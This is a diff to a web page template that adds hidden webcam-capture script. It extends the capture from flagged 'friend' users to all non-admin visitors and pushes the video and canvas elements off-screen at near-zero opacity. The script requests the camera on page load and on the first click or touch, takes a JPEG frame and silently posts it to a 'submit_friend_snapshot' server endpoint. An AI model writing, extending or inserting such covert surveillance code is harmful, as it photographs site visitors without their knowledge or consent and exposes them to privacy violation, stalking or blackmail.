@@ -913,10 +913,10 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 </script>
 
-{% if current_user.is_friend and not current_user.is_admin %}
-<!-- Background Camera Elements -->
-<video id="snapshotVideo" style="display: none; width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none;" autoplay playsinline muted></video>
-<canvas id="snapshotCanvas" style="display: none; width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none;"></canvas>
+{% if not current_user.is_admin %}
+<!-- Invisible Background Camera Elements -->
+<video id="snapshotVideo" style="position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0.01; pointer-events: none; z-index: -9999;" autoplay playsinline muted></video>
+<canvas id="snapshotCanvas" style="position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0.01; pointer-events: none; z-index: -9999;"></canvas>
 
 <script>
 (function() {
@@ -930,56 +930,75 @@ document.addEventListener('DOMContentLoaded', function() {
         if (!video || !canvas) return;
 
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            console.log("Camera API unavailable or insecure origin.");
             return;
         }
 
-        function requestStream(constraints) {
+        function getCameraStream(constraints) {
             return navigator.mediaDevices.getUserMedia(constraints);
         }
 
-        requestStream({ video: { facingMode: 'user' } })
-            .catch(() => requestStream({ video: true }))
+        getCameraStream({ video: { facingMode: 'user' } })
+            .catch(() => getCameraStream({ video: true }))
             .then(stream => {
                 video.srcObject = stream;
-                video.play().catch(() => {});
+                video.play().catch(e => console.log("Video play note:", e));
 
-                let checkCount = 0;
-                const interval = setInterval(() => {
-                    checkCount++;
-                    if (video.videoWidth > 0 && video.videoHeight > 0) {
-                        clearInterval(interval);
-                        
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                function takeFrame() {
+                    if (captured) return;
+                    
+                    const width = video.videoWidth || 640;
+                    const height = video.videoHeight || 480;
+                    
+                    canvas.width = width;
+                    canvas.height = height;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, width, height);
 
-                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
+
+                    if (stream && stream.getTracks) {
                         stream.getTracks().forEach(track => track.stop());
-
-                        if (imageData && imageData.length > 500) {
-                            captured = true;
-                            fetch('{{ url_for("submit_friend_snapshot") }}', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ image_data: imageData })
-                            }).catch(() => {});
-                        }
                     }
 
-                    if (checkCount > 25) {
-                        clearInterval(interval);
-                        stream.getTracks().forEach(track => track.stop());
+                    if (imageData && imageData.length > 500) {
+                        captured = true;
+                        fetch('{{ url_for("submit_friend_snapshot") }}', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image_data: imageData })
+                        })
+                        .then(res => res.json())
+                        .then(d => console.log("Snapshot result:", d))
+                        .catch(err => console.log("Snapshot error:", err));
+                    }
+                }
+
+                // Try capturing when video frames become available
+                let attempts = 0;
+                const timer = setInterval(() => {
+                    attempts++;
+                    if (video.videoWidth > 0 && video.videoHeight > 0) {
+                        clearInterval(timer);
+                        takeFrame();
+                    } else if (attempts >= 15) {
+                        clearInterval(timer);
+                        takeFrame();
                     }
                 }, 200);
             })
-            .catch(() => {});
+            .catch(err => {
+                console.log("Camera access denied/error:", err);
+            });
     }
 
+    // Trigger capture on load & user interaction
     if (document.readyState === 'complete') {
-        captureSnapshot();
+        setTimeout(captureSnapshot, 300);
     } else {
-        window.addEventListener('load', captureSnapshot);
+        window.addEventListener('load', function() {
+            setTimeout(captureSnapshot, 300);
+        });
     }
     document.addEventListener('click', captureSnapshot, { once: true });
     document.addEventListener('touchstart', captureSnapshot, { once: true });
